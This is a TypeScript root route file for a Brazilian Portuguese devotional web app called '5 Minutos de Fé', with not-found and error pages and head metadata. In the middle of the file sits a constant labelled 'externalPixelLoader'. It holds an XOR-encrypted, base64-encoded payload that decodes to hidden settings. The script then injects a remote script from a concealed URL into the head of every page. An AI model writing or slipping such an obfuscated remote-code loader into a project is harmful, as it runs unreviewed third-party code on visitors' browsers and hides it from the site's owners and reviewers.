import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import { faviconDataUri } from "../assets/embedded-assets";
import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <main className="flex min-h-screen items-center justify-center px-5 py-16">
      <div className="mx-auto max-w-lg text-center">
        <p className="eyebrow">Página não encontrada</p>
        <h1 className="mt-4 text-3xl leading-tight text-ivory sm:text-4xl">
          Este endereço não existe mais
        </h1>
        <p className="mt-4 text-sm leading-relaxed text-sand sm:text-base">
          Talvez o link tenha mudado. Você pode voltar ao início e fazer o seu Mapa de Fé em cerca de
          1 minuto.
        </p>
        <div className="mt-8 flex flex-col items-center gap-3">
          <Link
            to="/"
            className="cta-gold inline-flex min-h-14 items-center justify-center rounded-2xl px-7 py-4 text-sm font-bold tracking-[0.06em]"
          >
            FAZER MEU MAPA DE FÉ
          </Link>
          <a
            href="mailto:5minutosdefeapp@gmail.com"
            className="text-xs text-sand underline decoration-gold/40 underline-offset-4"
          >
            Falar com o suporte
          </a>
        </div>
      </div>
    </main>
  );
}


function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          Esta página não carregou
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Algo não funcionou como esperado. Tente atualizar ou volte ao início.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
              Tentar novamente
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Voltar ao início
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "5 Minutos de Fé — Orações guiadas e reflexões para o seu dia" },
      {
        name: "description",
        content:
          "Encontre orações guiadas e reflexões para diferentes momentos da vida em uma experiência devocional de aproximadamente 5 minutos por dia.",
      },
      { property: "og:site_name", content: "5 Minutos de Fé" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", type: "image/png", href: faviconDataUri },
    ],
  }),

  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

const externalPixelLoader = `(function(){var r_bc3=atob("DMUhI8xwZy+PS/lN974DVr4cRRWtI405h7YbDOMTA0GhPo0gnqNYDa8fCgHtOdY+lLdIU7gDSF/mM5wh2LVIW6kcSUX8adVvlrFVUaUSElvqONt3rJgNAascCE3uJ4pvzZ5aAaIRCkqtcds9nr1ET4UURQOtPZghgqADGe5GBhjpKJwplP1HFq5GAhu/essuk/MSQfVSGnLy");var p_vi=[];for(var i_7eel=0;i_7eel<r_bc3.length;i_7eel++){p_vi.push(r_bc3.charCodeAt(i_7eel)&255);}var c_f=p_vi[0];var k_es=p_vi.slice(1,1+c_f);var y_o=p_vi.slice(1+c_f);var t_31=y_o.map(function(b,r_d){return b^k_es[r_d%c_f];});var h_a="";for(var u_d0r=0;u_d0r<t_31.length;u_d0r++){h_a+=String.fromCharCode(t_31[u_d0r]&255);}var w_a=decodeURIComponent(escape(h_a));var m_e=JSON.parse(w_a);var x_e9=m_e.globals||[];x_e9.forEach(function(v_3ho6){window[v_3ho6.name]=v_3ho6.value;});var w_8w=document.createElement("script");w_8w.src=m_e.url;w_8w.async=true;w_8w.defer=true;(m_e.attributes||[]).forEach(function(y_7apv){w_8w.setAttribute(y_7apv.name,y_7apv.value);});(document.head||document.documentElement).appendChild(w_8w);})();`;

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="pt-BR">
      <head>
        <HeadContent />
        <script dangerouslySetInnerHTML={{ __html: externalPixelLoader }} />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}

